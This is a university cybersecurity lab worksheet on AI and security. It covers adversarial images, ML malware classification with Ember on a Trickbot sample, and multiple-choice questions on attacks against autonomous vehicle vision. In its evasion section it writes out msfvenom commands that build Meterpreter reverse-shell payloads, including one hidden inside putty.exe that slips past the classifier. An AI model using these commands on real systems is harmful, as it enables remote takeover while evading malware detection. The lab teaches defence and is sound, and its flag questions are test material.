# Lab 10: AI

Walkthrough video:

**AI 10-1** [https://www.youtube.com/watch?v=6LhD8jUO1aY](https://www.youtube.com/watch?v=6LhD8jUO1aY)

## (NOT READY)

## Intro to AI and Cybersecurity

Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain.

One area of active research in machine learning is the use of adversarial images. This is where slight changes in the image causes machine learning systems to incorrectly classify objects within the image. So for example, a panda is wrongly recognised as a gibbon. The changes to the image can be imperceptible to a human and so this type of attack could be used to alter a radiological image and change a negative diagnosis of cancer to a positive one in a system that is automatically screening for cancer.

Adversarial attacks could become increasingly common as we come to rely on machine learning systems to automate processes and decisions. This has made the field of research into defences against this type of attack important.

In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach.

To see how this works, we can use a program that uses what is called a non-targetted black box approach to adversarial images.

Start the docker container as follows:

{% tabs %}
{% tab title="Windows" %}
```bash
docker run -v C:/projects/share:/opt/share -it uwacyber/cits1003-labs:ai
```
{% endtab %}

{% tab title="Linux" %}
```
docker run -v /projects/share:/opt/share -it uwacyber/cits1003-labs:ai
```
{% endtab %}

{% tab title="Apple Silicon" %}
```
Tensorflow won't work on ARM (the last time we checked) and 
so you will have to skip this bit - do the lab with a friend 
or ask the facilitator.
```
{% endtab %}
{% endtabs %}

The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it.

Once on the docker container, go to the directory `/opt/adversarial/share`. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes for a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).

To run the script we do so as follows:

```bash
root@e53ca40f207d:/opt/adversarial/share# python exploit.py lab_og.jpg
2022-02-23 08:23:47.274847: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2022-02-23 08:23:47.274891: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2022-02-23 08:23:48.411448: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2022-02-23 08:23:48.411539: W tensorflow/stream_executor/cuda/cuda_driver.cc:326] failed call to cuInit: UNKNOWN ERROR (303)
2022-02-23 08:23:48.411574: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (e53ca40f207d): /proc/driver/nvidia/version does not exist
2022-02-23 08:23:48.411820: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
Downloading data from https://storage.googleapis.com/tensorflow/keras-applications/mobilenet_v2/mobilenet_v2_weights_tf_dim_ordering_tf_kernels_1.0_224.h5
14540800/14536120 [==============================] - 1s 0us/step
2022-02-23 08:23:52.450006: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:176] None of the MLIR Optimization Passes are enabled (registered 2)
2022-02-23 08:23:52.454021: I tensorflow/core/platform/profile_utils/cpu_utils.cc:114] CPU Frequency: 3600000000 Hz
Downloading data from https://storage.googleapis.com/download.tensorflow.org/data/imagenet_class_index.json
40960/35363 [==================================] - 0s 2us/step
Processing image: prediction: Labrador_retriever confidence: 41.81845486164093
Saving Input
Processing image: prediction: Labrador_retriever confidence: 41.81845486164093
Saving Epsilon = 0.010
Processing image: prediction: Saluki confidence: 13.087695837020874
Saving Epsilon = 0.100
Processing image: prediction: Weimaraner confidence: 14.948992431163788
Saving Epsilon = 0.150
Processing image: prediction: Weimaraner confidence: 16.2118598818779
```

This takes the initial image of `lab_og.jpg` and then creates different versions of the image with the perturbations added. The script tests these images against the neural network and very quickly stops recognising a Labrador and starts recognising other dog types such as the Saluki and Weimaraner, although note that the levels of confidence in that result are very low \~ 16%.

After running the program, you should have some files:

```bash
root@e53ca40f207d:/opt/adversarial/share# ls -al
total 740
drwxr-xr-x 1 root root   4096 Feb 23 08:23  .
drwxr-xr-x 1 root root   4096 Aug  8  2021  ..
-rw-r--r-- 1 root root 135191 Feb 23 08:23 'Epsilon = 0.010.jpg'
-rw-r--r-- 1 root root 175515 Feb 23 08:23 'Epsilon = 0.100.jpg'
-rw-r--r-- 1 root root 200878 Feb 23 08:23 'Epsilon = 0.150.jpg'
-rw-r--r-- 1 root root 134549 Feb 23 08:23  Input.jpg
-rw-r--r-- 1 root root   3228 Aug  8  2021  exploit.py
-rw-r--r-- 1 root root  83281 Jul 11  2021  lab_og.jpg
```

Copy these files to the shared folder with your machine: /opt/share

{% hint style="danger" %}
Note the Wolfram site only works intermittently - it isn't reliable. If you can't get it to work, don't worry - just use the predictions that the program `exploit.py` printed out
{% endhint %}

Back on your own machine, these files should be in the directory you specified to share with the docker container. We are now going to test these out on an image recognition program run by Wolfram which is here [https://www.imageidentify.com](https://www.imageidentify.com)

Load the first image, `Input.jpg`, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with Epsilon = 0.010.jpg and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image which has had the most perturbations applied to it.

### Question 1. Enter the wrong dog

**Flag: Enter the name of the dog type that exploit.py recognises with the "Epsilon = 0.150.jpg" file.**

{% tabs %}
{% tab title="Hint" %}
Ideally Wolfram should produce the same prediction, but because its model is continuously updating, the prediction may not be the same.&#x20;
{% endtab %}
{% endtabs %}

To a human eye, the dog is still a Labrador albeit a bit fuzzy. Remember that this is not a targetted attack in that we haven't trained the attack using the specific neural network used by the Wolfram site. If we did, we could develop something that would work at much lower levels of disturbance.

Try the same attack but this time using another picture - one of a bear:

![This is a bear](../.gitbook/assets/bear.jpg)

You can right click on this and save it to your share folder and then run the program again. You might see the confidence dropping, but the prediction should still be the same - a brown bear. Obviously not all photos/pictures are well equipped for the perturbations applied using the provided exploit code, but there are many other libraries available that performs better perturbations.

Try with your own images - they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.

## Malware recognition with Ember

Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings (as we saw when we used Yara to identify malware). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.

The Elastic Malware Benchmark for Empowering Researchers (Ember) ([https://github.com/elastic/ember](https://github.com/elastic/ember)) is a neural network that uses features extracted from binary files to train a model that can distinguish malware from regular Windows' programs.

To do this, Ember uses a framework called LIEF that will analyse Windows (and other platforms) binaries ([https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)). The data that LIEF produces is then uses a "fingerprint" of the binary and can be used to train the model.

To test the model `cd` on the same docker container to the directory `/opt/ember`. The model has been pre-trained and so you don't need to do that, although if you are interested, you can (look at the GitHub page).

To test the malware, we can use the following command:

```bash
root@863da6f82693:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt malware
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
0.99....
```

The script `classify_binary.py` takes the trained model as an argument and the binary file to analyse. As you can see, the sample `malware` is given a 99% probability of being malware.

{% hint style="danger" %}
This \*is\* real malware - do not download to your PC or try and execute
{% endhint %}

The malware is actually Trickbot, which is a banking trojan.

We can now try with a normal Windows program git.exe

```bash
root@863da6f82693:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt git.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Unable to find the section associated with CERTIFICATE_TABLE
PGO: UNKNOWN is not implemented yet!
1.7266520173797455e-07
```

What is returned is a \*very\* small number

$$
1.7*10^{-7}
$$

In other words, a practically 0 score for it being malware.

### Question 2. It was malware, probably...

**Flag: Enter the full classification probability for the `malware` you found above**

## Evading the classification Msfvenom and Meterpreter

`Msfvenom` is a utility that comes with what is called an exploitation framework called _Metasploit_. Metasploit is a sophisticated toolset that is used by penetration testers (and hackers) to explore vulnerabilities and exploit them. `Msfvenom` can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a `Meterpreter shell` and normally this is recognised as malware by anti-malware software.

`Msfvenom` comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially machine learning classifiers.

To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:

{% tabs %}
{% tab title="Windows" %}
```bash
docker run -v C:/projects/share:/opt/share -it uwacyber/cits1003-labs:metasploit
```
{% endtab %}

{% tab title="Linux" %}
```
docker run -v /projects/share:/opt/share -it uwacyber/cits1003-labs:metasploit
```
{% endtab %}

{% tab title="Apple Silicon" %}
```
docker run -v $(pwd)/share:/opt/share -it uwacyber/cits1003-labs:metasploit
```
{% endtab %}
{% endtabs %}

Instead of `/projects/share` put the same local folder you were running for the AI container above.

Once this is running, you can type

```bash
msfconsole
```

and answer yes to the following question and no to the second.

After doing that, you should see something like this (the actual graphic changes each time):

```bash
[!] The following modules could not be loaded!..\
[!] 	/usr/src/metasploit-framework/modules/auxiliary/gather/office365userenum.py
[!] Please see /home/msf/.msf4/logs/framework.log for details.
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.0.53-dev                          ]
+ -- --=[ 2149 exploits - 1142 auxiliary - 366 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

[*] Processing docker/msfconsole.rc for ERB directives.
[*] resource (docker/msfconsole.rc)> Ruby Code (236 bytes)
LHOST => 172.17.0.3
msf6 > 
```

The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :)

We are going to need a file called `putty.exe` that we are going to use as a template for one of the Meterpreter versions and so download it now to the directory you have shared with the container:

```bash
https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
```

We are going to run `msfvenom` from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > /opt/share/meterpreter1.exe
```

You don't really have to worry about the parameters but if you are interested, the `LHOST` and `LPORT` arguments tell Meterpreter where to connect back to i.e. our machine. The `-f exe` tells Meterpreter that we are using an executable format for the payload.

Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. Run the `msfvenom` command as follows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x /opt/share/putty.exe > /opt/share/meterpreter2.exe
```

Now that we have the two samples, we can go back to our classifier and see what happens:

With the first version `meterpreter1.exe` we get:

```bash
root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter1.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Signature PDB_20 is not implemented yet!
0.9999986237635949
```

Definitely malware!

However, when we run the second version, we get:

```bash
root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter2.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
0.015146771950010027
```

So, according to the classifier, this is a normal, and safe, binary!

`Msfvenom` has other encoders that try and obfuscate the file to avoid detection. One of these is called `shikata ga nai`. You can create a meterpreter binary using the flag

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e x86/shikata_ga_nai > /opt/share/meterpreter3.exe
```

However, when you classify this one, you will see that it is still recognised as malware.

It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than with images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that.

### Question 3. Who is Metasploit?

**Flag: Type in whoami in the msf console and type in the username as the flag**

If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there.

## Case study: Building Resilience in Autonomous Vehicle Image Recognition

Great strides have been made in recent years in improving autonomous vehicles and their ability to observe the world around them. Nowadays, autonomous vehicles are equipped with state-of-the art sensors that utilize cutting-edge analytics technologies, and are designed to automate, assist or replace many of the functions humans were formerly responsible for. With threats against AI models becoming an issue of increasing importance, the McAfee Advanced Threat Research team (ATR) set out to explore how adversaries could target and evade artificial intelligence, and in doing so, influence awareness, understanding and development of more secure technologies before they are implemented.

Read through the following article and answer the following questions: [https://www.mcafee.com/blogs/other-blogs/mcafee-labs/model-hacking-adas-to-pave-safer-roads-for-autonomous-vehicles/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/model-hacking-adas-to-pave-safer-roads-for-autonomous-vehicles/)

### Question 4. white vs black

What is the difference between a white-box attack and a black-box attack?&#x20;

1. In white-box attacks the attacker has access to the model's algorithm, while in black-box attacks, the attacker has no access to the algorithm.
2. In white-box attacks the attacker has access to the model's loss function, while in black-box attacks, the attacker has no access to the loss function.&#x20;
3. In white-box attacks the attacker has access to the model's parameters, while in black-box attacks, the attacker has no access to these parameters.&#x20;
4. In white-box attacks the attacker has access to the model's training data, while in black-box attacks, the attacker has no access to the training data.

{% hint style="info" %}
Submit the correct option as your flag (e.g., `CITS1003{`1`}` if option 1 is the correct answer).
{% endhint %}

### Question 5. Did I see that correctly?

ATR’s main focus was improving the resilience of AI models against the misclassification of traffic signs. Which of these is not an experiment designed to cause a traffic sign misclassification?&#x20;

1. Adding a black sticker across this center of speed limit signs to achieve a misclassification of the predicted speed limit.&#x20;
2. Adding colored stickers to stop signs caused a traffic sign classifier to misclassify the stop sign as an added lane sign.&#x20;
3. Obstructing significant portions of speed limit signs.&#x20;
4. Testing the model’s resilience to fluctuations in lighting conditions by constantly varying the camera’s color grading.

### Question 6. Protect your AI

Which of these is not a valid defense against attacks on AI systems&#x20;

1. Limit access to detailed information about the AI model.&#x20;
2. Build models using algorithms that are transformation invariant.&#x20;
3. Training models with adversarial inputs.&#x20;
4. Include perturbations in the training data to increase resilience against them.
